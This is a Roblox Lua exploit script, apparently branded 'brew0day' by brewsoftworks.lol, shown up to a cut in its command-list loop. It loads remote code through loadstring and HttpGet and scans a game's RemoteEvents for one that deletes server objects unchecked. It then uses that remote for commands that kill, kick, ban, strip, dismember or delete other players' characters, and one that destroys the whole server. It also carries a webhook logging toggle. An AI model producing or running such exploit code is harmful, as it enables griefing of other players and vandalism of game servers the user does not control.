Debugging=false
zeroversion=2
if game.CoreGui:FindFirstChild('brewHarked') then game.CoreGui.brewHarked:Destroy() end
local brewHarked = Instance.new("ScreenGui")
local Watermark = Instance.new("TextLabel")
local Commands = Instance.new("ScrollingFrame")
local UICorner = Instance.new("UICorner")
local Watermark_2 = Instance.new("TextLabel")
local Settings = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local Watermark_3 = Instance.new("TextLabel")
local Watermark_4 = Instance.new("TextLabel")
local GameLogging = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Bar = Instance.new("Frame")
local Command = Instance.new("TextBox")
local UICorner_4 = Instance.new("UICorner")
local UICorner_5 = Instance.new("UICorner")
local mobileBar = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
brewHarked.Name = "brewHarked"
brewHarked.Parent = game.CoreGui
brewHarked.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
brewHarked.ResetOnSpawn = false
Watermark.Name = "Watermark"
Watermark.Parent = brewHarked
Watermark.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Watermark.BackgroundTransparency = 1.000
Watermark.BorderColor3 = Color3.fromRGB(0, 0, 0)
Watermark.BorderSizePixel = 0
Watermark.Position = UDim2.new(7.95557309e-09, 0, 0.978935719, 0)
Watermark.Size = UDim2.new(0, 191, 0, 19)
Watermark.Font = Enum.Font.Ubuntu
Watermark.Text = "brewsoftworks.lol"
Watermark.TextColor3 = Color3.fromRGB(255, 255, 255)
Watermark.TextSize = 18.000
Watermark.TextTransparency = 0.600
Watermark.TextWrapped = true
Watermark.TextXAlignment = Enum.TextXAlignment.Left
Commands.Name = "Commands"
Commands.Parent = brewHarked
Commands.AnchorPoint = Vector2.new(0.5, 0.5)
Commands.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Commands.BorderColor3 = Color3.fromRGB(0, 0, 0)
Commands.BorderSizePixel = 0
Commands.Position = UDim2.new(0.5, 0, 0.5, 0)
Commands.Size = UDim2.new(0, 287, 0, 316)
Commands.Visible = false
local frame = Commands
local dragToggle, dragStart, startPos
local function updateInput(input)
	local delta = input.Position - dragStart
	local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	game:GetService('TweenService'):Create(frame, TweenInfo.new(0.25), {Position = position}):Play()
end
frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragToggle, dragStart, startPos = true, input.Position, frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragToggle = false
			end
		end)
	end
end)
game:GetService("UserInputService").InputChanged:Connect(function(input)
	if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragToggle then
		updateInput(input)
	end
end)
UICorner.CornerRadius = UDim.new(0, 3)
UICorner.Parent = Commands
Watermark_2.Name = "Watermark"
Watermark_2.Parent = Commands
Watermark_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Watermark_2.BackgroundTransparency = 1.000
Watermark_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Watermark_2.BorderSizePixel = 0
Watermark_2.Position = UDim2.new(0.00696864119, 0, -0.00207693363, 5)
Watermark_2.Size = UDim2.new(0, 287, 0, 19)
Watermark_2.Font = Enum.Font.Ubuntu
Watermark_2.Text = "brew0day commands"
Watermark_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Watermark_2.TextSize = 18.000
Watermark_2.TextTransparency = 0.600
Watermark_2.TextWrapped = true
Settings.Name = "Settings"
Settings.Parent = brewHarked
Settings.AnchorPoint = Vector2.new(0.5, 0.5)
Settings.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Settings.BorderColor3 = Color3.fromRGB(0, 0, 0)
Settings.BorderSizePixel = 0
Settings.Position = UDim2.new(0.5, 0, 0.5, 0)
Settings.Size = UDim2.new(0, 419, 0, 241)
Settings.Visible = false
local frame = Settings
local dragToggle, dragStart, startPos
local function updateInput(input)
	local delta = input.Position - dragStart
	local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	game:GetService('TweenService'):Create(frame, TweenInfo.new(0.25), {Position = position}):Play()
end
frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragToggle, dragStart, startPos = true, input.Position, frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragToggle = false
			end
		end)
	end
end)
game:GetService("UserInputService").InputChanged:Connect(function(input)
	if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragToggle then
		updateInput(input)
	end
end)
UICorner_2.CornerRadius = UDim.new(0, 3)
UICorner_2.Parent = Settings
Watermark_3.Name = "Watermark"
Watermark_3.Parent = Settings
Watermark_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Watermark_3.BackgroundTransparency = 1.000
Watermark_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
Watermark_3.BorderSizePixel = 0
Watermark_3.Position = UDim2.new(0.157326788, 0, -0.00207696809, 0)
Watermark_3.Size = UDim2.new(0, 287, 0, 19)
Watermark_3.Font = Enum.Font.Ubuntu
Watermark_3.Text = "brew0day settings"
Watermark_3.TextColor3 = Color3.fromRGB(255, 255, 255)
Watermark_3.TextSize = 18.000
Watermark_3.TextTransparency = 0.600
Watermark_3.TextWrapped = true
Watermark_4.Name = "Watermark"
Watermark_4.Parent = Settings
Watermark_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Watermark_4.BackgroundTransparency = 1.000
Watermark_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
Watermark_4.BorderSizePixel = 0
Watermark_4.Position = UDim2.new(-0.000191117244, 0, 0.948130488, 0)
Watermark_4.Size = UDim2.new(0, 419, 0, 12)
Watermark_4.Font = Enum.Font.Ubuntu
Watermark_4.Text = "@dex4tw | brewsoftworks.lol"
Watermark_4.TextColor3 = Color3.fromRGB(255, 255, 255)
Watermark_4.TextScaled = true
Watermark_4.TextSize = 18.000
Watermark_4.TextTransparency = 0.600
Watermark_4.TextWrapped = true
Watermark_4.TextXAlignment = Enum.TextXAlignment.Left
GameLogging.Name = "GameLogging"
GameLogging.Parent = Settings
GameLogging.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GameLogging.BackgroundTransparency = 1.000
GameLogging.BorderColor3 = Color3.fromRGB(0, 0, 0)
GameLogging.BorderSizePixel = 0
GameLogging.Position = UDim2.new(-0.000191117244, 0, 0.139001876, 0)
GameLogging.Size = UDim2.new(0, 151, 0, 19)
GameLogging.Font = Enum.Font.Ubuntu
GameLogging.Text = "Game Logging"
GameLogging.TextColor3 = Color3.fromRGB(255, 255, 255)
GameLogging.TextSize = 18.000
GameLogging.TextTransparency = 0.600
GameLogging.TextWrapped = true
TextButton.Parent = GameLogging
TextButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
TextButton.BorderColor3 = Color3.fromRGB(24, 24, 24)
TextButton.Position = UDim2.new(0.927152336, 0, 0, 0)
TextButton.Size = UDim2.new(0, 21, 0, 19)
TextButton.AutoButtonColor = false
TextButton.Modal = true
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = ""
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 14.000
UICorner_3.CornerRadius = UDim.new(0, 3)
UICorner_3.Parent = TextButton
Bar.Name = "Bar"
Bar.Parent = brewHarked
Bar.AnchorPoint = Vector2.new(0.5, 1)
Bar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Bar.BorderColor3 = Color3.fromRGB(0, 0, 0)
Bar.BorderSizePixel = 0
Bar.Position = UDim2.new(0.5, 0,0.999, 25)
Bar.Size = UDim2.new(0, 287, 0, 21)
Command.Name = "Command"
Command.Parent = Bar
Command.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Command.BorderColor3 = Color3.fromRGB(0, 0, 0)
Command.BorderSizePixel = 0
Command.Position = UDim2.new(0.0369003229, -6, 0, 0)
Command.Size = UDim2.new(0, 282, 0, 21)
Command.ClearTextOnFocus = true
Command.Font = Enum.Font.Gotham
Command.PlaceholderText = "[ Command ]"
Command.Text = ""
Command.TextColor3 = Color3.fromRGB(255, 255, 255)
Command.TextSize = 13.000
Command.TextWrapped = true
UICorner_4.CornerRadius = UDim.new(0, 2)
UICorner_4.Parent = Command
UICorner_5.CornerRadius = UDim.new(0, 2)
UICorner_5.Parent = Bar
mobileBar.Name = "mobileBar"
mobileBar.Parent = brewHarked
mobileBar.AnchorPoint = Vector2.new(0, 0.5)
mobileBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mobileBar.BorderColor3 = Color3.fromRGB(0, 0, 0)
mobileBar.BorderSizePixel = 0
mobileBar.Position = UDim2.new(0, 35, 0.5, 0)
mobileBar.Size = UDim2.new(0, 37, 0, 36)
mobileBar.Font = Enum.Font.Gotham
mobileBar.Text = "CMD"
mobileBar.TextColor3 = Color3.fromRGB(255, 255, 255)
mobileBar.TextSize = 14.000
local frame = mobileBar
local dragToggle, dragStart, startPos
local function updateInput(input)
	local delta = input.Position - dragStart
	local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	game:GetService('TweenService'):Create(frame, TweenInfo.new(0.25), {Position = position}):Play()
end
frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragToggle, dragStart, startPos = true, input.Position, frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragToggle = false
			end
		end)
	end
end)
game:GetService("UserInputService").InputChanged:Connect(function(input)
	if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragToggle then
		updateInput(input)
	end
end)
UICorner_6.CornerRadius = UDim.new(0, 3)
UICorner_6.Parent = mobileBar

--[[ Variables & Functions ]]--
zeroday = {
	["Remote"] = nil,

	["Commands"] = {},

	["Libraries"] = {
		["Notifications"] = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))()
	},

	["Services"] = {
		["UserInputService"] = game:GetService("UserInputService"),
		["Lighting"] = game:GetService("Lighting"),
		["ServerScriptService"] = game:GetService("ServerScriptService"), -- Client cannot access, remote can
		["ServerStorage"] = game:GetService("ServerStorage"),
		["Players"] = game:GetService("Players"),
		["ReplicatedStorage"] = game:GetService("ReplicatedStorage"),
		["SoundService"] = game:GetService("SoundService"),
		["TweenService"] = game:GetService("TweenService")
	},

	["Bans"] = {},

	["Settings"] = {
		["Serverlock"] = false
	}
}
shared["toWebhook"] = true

function zeroday:addCommand(command, callback, description, hidden)
	hidden = hidden or false
	table.insert(zeroday.Commands,{
		name = command:lower(),
		callback = callback,
		description = description,
		hidden = hidden
	})
end
function zeroday:Notify(title, description, duration)
	duration = duration or 3
	zeroday.Libraries.Notifications.Notify({Title=title,Description=description,Duration=tonumber(duration)})
end
function zeroday:Async(callback)
	coroutine.wrap(function()
		local success, err = pcall(callback)
		if not success then
			task.spawn(function()
				error("ZERODAY [Error]: " .. tostring(err))
			end)
		end
	end)()
end
function zeroday:Debug(text, t)
	if Debugging then
		t=t or 'ok'
		if t=='ok' or t=='okay' then
			print("ZERODAY [Ok]: "..text)
		elseif t=='warn' then
			warn("ZERODAY [Warn]: "..text)
		elseif t=='error' then
			zeroday:Async(function()
				error("ZERODAY [Error]"..text)
			end)
		end	
	end
end
function zeroday:toggleBar(targetPosition)
	if targetPosition:lower() == 'show' then
		targetPosition = UDim2.new(0.5, 0,0.999, -75)
		zeroday:Debug('showing bar')
	elseif targetPosition:lower() == 'hide' then
		targetPosition = UDim2.new(0.5, 0,0.999, 25)
		zeroday:Debug('hiding bar')
	end
	if currentTween then
		currentTween:Cancel()
	end
	local tweenInfo = TweenInfo.new(.15, Enum.EasingStyle.Quad)
	local tween = zeroday.Services.TweenService:Create(Bar, tweenInfo, {Position = targetPosition})
	tween:Play()
	currentTween = tween
	return tween
end
function zeroday:getPlayer(player)
	for index, plr in pairs(game.Players:GetChildren()) do
		if string.find(plr.Name:lower(), player:lower()) or string.find(plr.DisplayName:lower(), player:lower()) then
			return game.Players[plr.Name];
		end
	end
end

--[[ Files & Directories ]]--
if isfile("brewtw.txt") then
	if readfile("brewtw.txt") == "true" then shared["toWebhook"] = true else shared["toWebhook"] = false TextButton.BackgroundColor3 = Color3.fromRGB(24,24,24) end
else
	writefile("brewtw.txt", "true")
end

--[[ Vulnerability Finding ]]--
--@remotescrape.lua - look for a vulnerability in a remote
--brewsoftworks.lol | @dex4tw
if zeroday.Remote == nil then
	zeroday:Debug("Looking through common remotes", 'ok')
	for index, remote in pairs(game:GetDescendants()) do
		if remote:IsA("RemoteEvent") and string.find(remote.Name:lower(), 'destroy') or remote:IsA("RemoteEvent") and string.find(remote.Name:lower(), 'delete') or remote:IsA("RemoteEvent") and string.find(remote.Name:lower(), 'despawn') or remote:IsA("RemoteEvent") and string.find(remote.Name:lower(), 'remove') then
			for i,obj in pairs(workspace:GetDescendants()) do if obj:IsA("Part") then object=obj break end end
			objectparent = object.Parent
			zeroday:Debug("Got "..object:GetFullName(), 'ok')
			remote:FireServer(object)
			zeroday:Debug("Fired "..remote:GetFullName(), 'ok')
			wait(.55)
			if object.Parent ~= objectparent then
				zeroday.Remote = remote
				zeroday:Debug("Found remote!", 'ok')
				zeroday:Notify("zeroday located")
				break
			end
			wait(.25)
		end
	end
end
if zeroday.Remote == nil then
	zeroday:Debug("Looking through ReplicatedStorage", 'ok')
	for index, remote in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
		if remote:IsA("RemoteEvent") then
			for i,obj in pairs(workspace:GetDescendants()) do if obj:IsA("Part") then object=obj break end end
			objectparent = object.Parent
			zeroday:Debug("Got "..object:GetFullName(), 'ok')
			remote:FireServer(object)
			zeroday:Debug("Fired "..remote:GetFullName(), 'ok')
			wait(.55)
			if object.Parent ~= objectparent then
				zeroday.Remote = remote
				zeroday:Debug("Found remote!", 'ok')
				zeroday:Notify("zeroday located")
				break
			end
			wait(.25)
		end
	end
end
if zeroday.Remote == nil then
	zeroday:Debug("Looking through everything", 'ok')
	for index, remote in pairs(game:GetDescendants()) do
		if remote:IsA("RemoteEvent") then
			for i,obj in pairs(workspace:GetDescendants()) do if obj:IsA("Part") then object=obj break end end
			objectparent = object.Parent
			zeroday:Debug("Got "..object:GetFullName(), 'ok')
			remote:FireServer(object)
			zeroday:Debug("Fired "..remote:GetFullName(), 'ok')
			wait(.55)
			if object.Parent ~= objectparent then
				zeroday.Remote = remote
				zeroday:Debug("Found remote!", 'ok')
				zeroday:Notify("zeroday located")
				break
			end
			wait(.25)
		end
	end
end
if zeroday.Remote == nil then
	zeroday:Notify("zeroday was not found")
end
--

--[[ Command Handling ]]--
zeroday:addCommand("kill", function(plr)
	if plr:lower() == "all" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			zeroday:Async(function()
				repeat wait() until player.Character
				repeat wait() until player.Character.Head
				zeroday.Remote:FireServer(player.Character.Head)
			end)
		end
	elseif plr:lower() == "others" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			if player.Name ~= zeroday.Services.Players.LocalPlayer.Name then
				zeroday:Async(function()
					repeat wait() until player.Character
					repeat wait() until player.Character.Head
					zeroday.Remote:FireServer(player.Character.Head)
				end)
			end
		end
	else
		zeroday.Remote:FireServer(zeroday:getPlayer(plr).Character.Head)
	end
end, 'kill a player')
zeroday:addCommand("punish", function(plr)
	if plr:lower() == "all" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			zeroday:Async(function()
				repeat wait() until player.Character
				repeat wait() until player.Character.Humanoid
				zeroday.Remote:FireServer(player.Character.Humanoid)
				for i,v in pairs(player.Character:GetChildren()) do
					zeroday.Remote:FireServer(v)
				end
			end)
		end
	elseif plr:lower() == "others" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			if player.Name ~= zeroday.Services.Players.LocalPlayer.Name then
				zeroday:Async(function()
					repeat wait() until player.Character
					repeat wait() until player.Character.Humanoid
					zeroday.Remote:FireServer(player.Character.Humanoid)
					for i,v in pairs(player.Character:GetChildren()) do
						zeroday.Remote:FireServer(v)
					end
				end)
			end
		end
	else
		zeroday.Remote:FireServer(zeroday:getPlayer(plr).Character.Humanoid)
		for i,v in pairs(zeroday:getPlayer(plr).Character:GetChildren()) do
			zeroday.Remote:FireServer(v)
		end
	end
end, 'permanently delete a character')
zeroday:addCommand("ragdoll", function(plr)
	if plr:lower() == "all" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			zeroday:Async(function()
				repeat wait() until player.Character
				repeat wait() until player.Character.HumanoidRootPart
				zeroday.Remote:FireServer(player.Character.HumanoidRootPart)
			end)
		end
	elseif plr:lower() == "others" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			if player.Name ~= zeroday.Services.Players.LocalPlayer.Name then
				zeroday:Async(function()
					repeat wait() until player.Character
					repeat wait() until player.Character.HumanoidRootPart
					zeroday.Remote:FireServer(player.Character.HumanoidRootPart)
				end)
			end
		end
	else
		zeroday.Remote:FireServer(zeroday:getPlayer(plr).Character.HumanoidRootPart)
	end
end, 'ragdoll / trip a player')
zeroday:addCommand("naked", function(plr)
	if plr:lower() == "all" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			zeroday:Async(function()
				repeat wait() until player.Character
				if player.Character:FindFirstChild('Shirt') then zeroday.Remote:FireServer(player.Character.Shirt) end
				if player.Character:FindFirstChild('Pants') then zeroday.Remote:FireServer(player.Character.Pants) end
			end)
		end
	elseif plr:lower() == "others" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			if player.Name ~= zeroday.Services.Players.LocalPlayer.Name then
				zeroday:Async(function()
					repeat wait() until player.Character
					if player.Character:FindFirstChild('Shirt') then zeroday.Remote:FireServer(player.Character.Shirt) end
					if player.Character:FindFirstChild('Pants') then zeroday.Remote:FireServer(player.Character.Pants) end
				end)
			end
		end
	else
		if zeroday:getPlayer(plr).Character:FindFirstChild('Shirt') then zeroday.Remote:FireServer(zeroday:getPlayer(plr).Character.Shirt) end
		if zeroday:getPlayer(plr).Character:FindFirstChild('Pants') then zeroday.Remote:FireServer(zeroday:getPlayer(plr).Character.Pants) end
	end
end, 'remove a players clothes')
zeroday:addCommand("kick", function(plr)
	if plr:lower() == "all" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			if player.Name ~= zeroday.Services.Players.LocalPlayer.Name then
				zeroday:Async(function()
					zeroday.Remote:FireServer(player)
				end)
			end
		end
		zeroday.Remote:FireServer(zeroday.Services.Players.LocalPlayer)
	elseif plr:lower() == "others" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			if player.Name ~= zeroday.Services.Players.LocalPlayer.Name then
				zeroday:Async(function()
					zeroday.Remote:FireServer(player)
				end)
			end
		end
	else
		zeroday.Remote:FireServer(zeroday:getPlayer(plr))
	end
end, 'kick a player')
zeroday:addCommand("bald", function(plr)
	if plr:lower() == "all" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			if player.Name ~= zeroday.Services.Players.LocalPlayer.Name then
				for i,v in pairs(player.Character:GetChildren()) do
					if v:IsA("Accessory") then
						zeroday:Async(function()
							zeroday.Remote:FireServer(v)
						end)
					end
				end
			end
		end
		for i,v in pairs(zeroday.Services.Players.LocalPlayer.Character:GetChildren()) do
			if v:IsA("Accessory") then
				zeroday:Async(function()
					zeroday.Remote:FireServer(v)
				end)
			end
		end
	elseif plr:lower() == "others" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			if player.Name ~= zeroday.Services.Players.LocalPlayer.Name then
				for i,v in pairs(player.Character:GetChildren()) do
					if v:IsA("Accessory") then
						zeroday:Async(function()
							zeroday.Remote:FireServer(v)
						end)
					end
				end
			end
		end
	else
		for i,v in pairs(zeroday:getPlayer(plr).Character:GetChildren()) do
			if v:IsA("Accessory") then
				zeroday.Remote:FireServer(v)
			end
		end

	end
end, 'get rid of a players accessories')
zeroday:addCommand("nolimbs", function(plr)
	if plr:lower() == "all" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			if player.Name ~= zeroday.Services.Players.LocalPlayer.Name then
				task.spawn(function()
					for i,l in pairs(player.Character:GetChildren()) do
						if l.Name ~= "Torso" and l.Name ~= "Head" and l.Name ~= "HumanoidRootPart" and l.Name ~= "UpperTorso" and l.Name ~= "Humanoid" and l.Name ~="LowerTorso" and l:IsA("Part") or l.Name ~= "Torso" and l.Name ~= "Head" and l.Name ~= "HumanoidRootPart" and l.Name ~= "UpperTorso" and l.Name ~= "Humanoid" and l.Name ~="LowerTorso" and l:IsA("MeshPart") then
							zeroday.Remote:FireServer(l)
						end
					end
				end)
			end
		end
		for i,l in pairs(zeroday.Services.Players.LocalPlayer.Character:GetChildren()) do
			if l.Name ~= "Torso" and l.Name ~= "Head" and l.Name ~= "HumanoidRootPart" and l.Name ~= "UpperTorso" and l.Name ~= "Humanoid" and l.Name ~="LowerTorso" and l:IsA("Part") or l.Name ~= "Torso" and l.Name ~= "Head" and l.Name ~= "HumanoidRootPart" and l.Name ~= "UpperTorso" and l.Name ~= "Humanoid" and l.Name ~="LowerTorso" and l:IsA("MeshPart") then
				zeroday.Remote:FireServer(l)
			end
		end
	elseif plr:lower() == "others" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			if player.Name ~= zeroday.Services.Players.LocalPlayer.Name then
				task.spawn(function()
					for i,l in pairs(player.Character:GetChildren()) do
						if l.Name ~= "Torso" and l.Name ~= "Head" and l.Name ~= "HumanoidRootPart" and l.Name ~= "UpperTorso" and l.Name ~= "Humanoid" and l.Name ~="LowerTorso" and l:IsA("Part") or l.Name ~= "Torso" and l.Name ~= "Head" and l.Name ~= "HumanoidRootPart" and l.Name ~= "UpperTorso" and l.Name ~= "Humanoid" and l.Name ~="LowerTorso" and l:IsA("MeshPart") then
							zeroday.Remote:FireServer(l)
						end
					end
				end)
			end
		end
	else
		for i,l in pairs(zeroday:getPlayer(plr).Character:GetChildren()) do
			if l.Name ~= "Torso" and l.Name ~= "Head" and l.Name ~= "HumanoidRootPart" and l.Name ~= "UpperTorso" and l.Name ~= "Humanoid" and l.Name ~="LowerTorso" and l:IsA("Part") or l.Name ~= "Torso" and l.Name ~= "Head" and l.Name ~= "HumanoidRootPart" and l.Name ~= "UpperTorso" and l.Name ~= "Humanoid" and l.Name ~="LowerTorso" and l:IsA("MeshPart") then
				zeroday.Remote:FireServer(l)
			end
		end
	end
end, 'remove a players limbs')
zeroday:addCommand("noface", function(plr)
	if plr:lower() == "all" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			if player.Name ~= zeroday.Services.Players.LocalPlayer.Name then
				task.spawn(function()
					zeroday.Remote:FireServer(player.Character.Head.face)
				end)
			end
		end
		zeroday.Remote:FireServer(game.Players.LocalPlayer.Character.Head.face)
	elseif plr:lower() == "others" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			if player.Name ~= zeroday.Services.Players.LocalPlayer.Name then
				task.spawn(function()
					zeroday.Remote:FireServer(player.Character.Head.face)
				end)
			end
		end
	else
		zeroday.Remote:FireServer(zeroday:getPlayer(plr).Character.Head.face)
	end
end, 'remove a players face')
zeroday:addCommand("noanims", function(plr)
	if plr:lower() == "all" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			if player.Name ~= zeroday.Services.Players.LocalPlayer.Name then
				task.spawn(function()
					zeroday.Remote:FireServer(player.Character.Animate)
				end)
			end
		end
		zeroday.Remote:FireServer(game.Players.LocalPlayer.Character.Animate)
	elseif plr:lower() == "others" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			if player.Name ~= zeroday.Services.Players.LocalPlayer.Name then
				task.spawn(function()
					zeroday.Remote:FireServer(player.Character.Animate)
				end)
			end
		end
	else
		zeroday.Remote:FireServer(zeroday:getPlayer(plr).Character.Animate)
	end
end, 'remove a players animations')
zeroday:addCommand("blockhead", function(plr)
	if plr:lower() == "all" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			if player.Name ~= zeroday.Services.Players.LocalPlayer.Name then
				task.spawn(function()
					zeroday.Remote:FireServer(player.Character.Head.Mesh)
				end)
			end
		end
		zeroday.Remote:FireServer(game.Players.LocalPlayer.Character.Head.Mesh)
	elseif plr:lower() == "others" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			if player.Name ~= zeroday.Services.Players.LocalPlayer.Name then
				task.spawn(function()
					zeroday.Remote:FireServer(player.Character.Head.Mesh)
				end)
			end
		end
	else
		zeroday.Remote:FireServer(zeroday:getPlayer(plr).Character.Head.Mesh)
	end
end, 'remove the mesh of a players head')
zeroday:addCommand("nospawn", function()
	for i,v in pairs(workspace:GetDescendants()) do
		if v:IsA("SpawnLocation") then
			zeroday.Remote:FireServer(v)
		end
	end
end, "remove all spawn-locations")
zeroday:addCommand("noseats", function()
	for i,v in pairs(workspace:GetDescendants()) do
		if v:IsA("Seat") or v:IsA("VehicleSeat") then
			zeroday.Remote:FireServer(v)
		end
	end
end, "remove all spawn-locations")
zeroday:addCommand("ban", function(plr)
	if plr:lower() == "all" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			if player.Name ~= zeroday.Services.Players.LocalPlayer.Name then
				zeroday:Async(function()
					table.insert(zeroday.Bans, player.Name)
					zeroday.Remote:FireServer(player)
					zeroday:Debug("Banned", player.Name)
				end)
			end
		end
	elseif plr:lower() == "others" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			if player.Name ~= zeroday.Services.Players.LocalPlayer.Name then
				zeroday:Async(function()
					table.insert(zeroday.Bans, player.Name)
					zeroday.Remote:FireServer(player)
					zeroday:Debug("Banned", player.Name)
				end)
			end
		end
	else
		table.insert(zeroday.Bans, zeroday:getPlayer(plr).Name)
		zeroday.Remote:FireServer(zeroday:getPlayer(plr))
		zeroday:Debug("Banned", zeroday:getPlayer(plr).Name)
	end
end, 'ban a player')
zeroday:addCommand("unban", function(plr)
	if plr:lower() == "all" then
		for i,player in pairs(zeroday.Services.Players:GetChildren()) do
			table.clear(zeroday.Bans)
		end
	elseif plr:lower() == "others" then
		table.clear(zeroday.Bans)
	else
		for index, player in pairs(zeroday.Bans) do
			if string.find(player:lower(), plr:lower()) then
				toUnban = player.Name
				zeroday:Debug("Unbanning", player.Name)
			end
		end
		for i, value in ipairs(zeroday.Bans) do
			if value == toUnban then
				index = i
				zeroday:Debug("Got index", tostring(index))
				break
			end
		end
		table.remove(zeroday.Bans, index)
		zeroday:Debug("Unbanned user!")
	end
end, 'unban a player')
zeroday:addCommand("bans", function(plr)
	local bans = ''
	for i,v in pairs(zeroday.Bans) do
		bans = bans..v..', '
	end
	zeroday:Notify("Bans", bans, 10)
end, 'view your bans')
zeroday:addCommand("serverlock", function(plr)
	zeroday.Settings.Serverlock = true
	zeroday:Notify("Server locked")
end, 'lock the server')
zeroday:addCommand("unserverlock", function(plr)
	zeroday.Settings.Serverlock = false
	zeroday:Notify("Server unlocked")
end, 'unlock the server')
zeroday:addCommand("destroyserver", function(plr)
	for i,v in pairs(game:GetDescendants()) do
		zeroday:Async(function()
			if v ~= zeroday.Remote and not v:IsA("Player") then
				zeroday.Remote:FireServer(v)
			end
		end)
	end
end, 'delete everything')
zeroday:addCommand("btools", function(plr)
	local BTool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
	BTool.RequiresHandle = false
	BTool.ToolTip = "brewsoftworks.lol - btools"
	BTool.Name = 'brewsoftworks.lol - btool'
	BTool.TextureId = "rbxassetid://6790887263"
	BTool.Activated:Connect(function()
		if game.Players.LocalPlayer:GetMouse().Target ~= nil then
			zeroday.Remote:FireServer(game.Players.LocalPlayer:GetMouse().Target)
		end
	end)
end, 'give yourself 1 building tool')
zeroday:addCommand("to", function(plr)
	if zeroday:getPlayer(plr).Character:FindFirstChild("HumanoidRootPart") then zeroday.Services.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = zeroday:getPlayer(plr).Character.HumanoidRootPart.CFrame else
		if zeroday:getPlayer(plr).Character:FindFirstChild("Torso") then zeroday.Services.Players.LocalPlayer.Character.Torso.CFrame = zeroday:getPlayer(plr).Character.Torso.CFrame end
	end
end, 'teleport to a player')
zeroday:addCommand("settings", function()
	if Settings.Visible == true then
		Settings.Visible = false
	else
		Settings.Visible = true
	end
end, 'view settings')
zeroday:addCommand("config", function()
	if Settings.Visible == true then
		Settings.Visible = false
	else
		Settings.Visible = true
	end
end, 'view settings', true)
zeroday:addCommand("commands", function()
	if Commands.Visible == true then
		Commands.Visible = false
	else
		Commands.Visible = true
	end
end, 'view commands')
zeroday:addCommand("cmds", function()
	if Commands.Visible == true then
		Commands.Visible = false
	else
		Commands.Visible = true
	end
end, 'view commands', true)

yPos = 26
for _, cmd in ipairs(zeroday.Commands) do
	if not cmd['hidden'] then
		local textLabel = Instance.new("TextLabel")
		textLabel.Parent = Commands
		textLabel.Text = cmd.name..' - '..cmd.description
		textLabel.Font = Enum.Font.Gotham
		textLabel.Size = UDim2.new(1, 0, 0, 19)
		textLabel.Position = UDim2.new(0, 0, 0, yPos)
		textLabel.BackgroundColor3 = Color3.new(1, 1, 1)
		textLabel.BackgroundTransparency = 1
		textLabel.TextSize = 13
